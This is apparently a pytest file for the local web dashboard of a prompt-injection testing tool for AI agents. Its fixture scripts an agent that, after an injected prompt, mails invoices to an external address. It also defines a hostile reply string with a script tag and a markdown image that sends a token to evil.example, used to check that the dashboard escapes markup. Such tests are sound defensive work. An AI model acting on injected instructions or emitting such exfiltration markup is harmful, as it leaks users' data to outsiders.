"""lure serve: the local dashboard's pages and its safety rules. A real
server on 127.0.0.1 with an OS-picked port; no model is called."""

import http.client
import io
import json
import threading
from pathlib import Path
from urllib.parse import quote

import pytest

duckdb = pytest.importorskip("duckdb")
pytestmark = pytest.mark.loopback

from lure import cli, store
from lure.serve import Dashboard, make_server
from tests.fakes import ScriptedAdapter, call, say
from tests.test_cli import SUMMARY
from tests.test_gate import IPI_001, _profile

REPO = Path(__file__).resolve().parent.parent
HOSTILE = '<script>alert(1)</script> ![x](https://evil.example/p.png?d=LURE-FAKE-1) <img src=x>'


@pytest.fixture(scope="module")
def site(tmp_path_factory):
    """A store with a profile run (manifest, approval possible), a run whose
    reply is hostile markup, and a decision log; and a server over it."""
    tmp = tmp_path_factory.mktemp("serve")
    profile = _profile(tmp)
    turns = [call("ap_mail_list"),
             call("ap_mail_send", "c2", to=["billing-verify@external.example"],
                  subject="Invoices", body="Attached."),
             say(SUMMARY)]
    mp = pytest.MonkeyPatch()
    mp.setattr(cli, "make_adapter", lambda target, model, **k: ScriptedAdapter(*turns,
                                                                               model=model))
    folder = tmp / "results" / "run"
    cli.main(["run", str(IPI_001.source), "--profile", str(profile), "--results-dir",
              str(folder)], io.StringIO())
    mp.setattr(cli, "make_adapter", lambda target, model, **k: ScriptedAdapter(
        call("read_inbox"), say(SUMMARY + " " + HOSTILE), model=model))
    hostile = tmp / "results" / "hostile"
    cli.main(["run", str(IPI_001.source), "--target", "anthropic", "--model", "scripted",
              "--results-dir", str(hostile)], io.StringIO())
    mp.undo()
    run_folder = next(p.parent for p in folder.rglob("manifest.json"))
    vetting = tmp / "results" / "vetting" / "ap-agent"
    vetting.mkdir(parents=True)
    (vetting / "decisions.jsonl").write_text(json.dumps({
        "decision_version": 1, "decided_at": "2026-10-25T11:00:00+00:00", "profile": "ap-agent",
        "decision": "approve-with-conditions", "by": "AP lead",
        "conditions": ["Remove ap_mail_send."], "run": str(run_folder)}) + "\n")
    db = tmp / "lure.duckdb"
    store.add(db, [tmp / "results"])
    server = make_server(Dashboard(db, REPO / "attacks", REPO / "lure.yaml"), port=0, quiet=True)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield {"server": server, "port": server.server_address[1], "db": db, "folder": run_folder,
           "hostile": hostile}
    server.shutdown()
    server.server_close()


def request(site, path, host=None, method="GET"):
    con = http.client.HTTPConnection("127.0.0.1", site["port"], timeout=30)
    headers = {} if host is False else {"Host": host or f"127.0.0.1:{site['port']}"}
    con.putrequest(method, path, skip_host=True)
    for k, v in headers.items():
        con.putheader(k, v)
    con.endheaders()
    response = con.getresponse()
    body = response.read().decode("utf-8")
    con.close()
    return response.status, {k.lower(): v for k, v in response.getheaders()}, body


def rows(site, sql):
    return store.query(site["db"], sql)[1]


def test_every_page_renders(site):
    run_id = rows(site, "SELECT id FROM runs WHERE verdict = 'Fail' LIMIT 1")[0][0]
    folder = quote(str(site["folder"]), safe="")
    for path, text in [("/", "Runs"), ("/runs?verdict=Fail", "Fail"),
                       (f"/run/{run_id}", "billing-verify@external.example"),
                       ("/attack/lure-ipi-001", "lure-ipi-001"),
                       ("/profiles", "ap-agent"), ("/profile/ap-agent", "approve with conditions"),
                       (f"/folder/report?path={folder}", "lure-ipi-001"),
                       (f"/folder/approval?path={folder}", "Sign-off")]:
        status, _, body = request(site, path)
        assert status == 200, path
        assert text in body, path


def test_the_approval_page_is_built_without_writing_files(site):
    before = sorted(p.name for p in site["folder"].iterdir())
    request(site, f"/folder/approval?path={quote(str(site['folder']), safe='')}")
    request(site, f"/folder/report?path={quote(str(site['folder']), safe='')}")
    assert sorted(p.name for p in site["folder"].iterdir()) == before


def test_a_folder_that_is_not_a_profile_run_explains_why_there_is_no_approval(site):
    status, _, body = request(site, f"/folder/approval?path={quote(str(site['hostile']), safe='')}")
    assert status == 200 and "not a profile run" in body


@pytest.mark.parametrize("path", ["/run/999999", "/run/x", "/profile/nobody", "/attack/nope",
                                  "/folder/report?path=%2Fetc", "/nothing"])
def test_unknown_things_are_404(site, path):
    assert request(site, path)[0] == 404
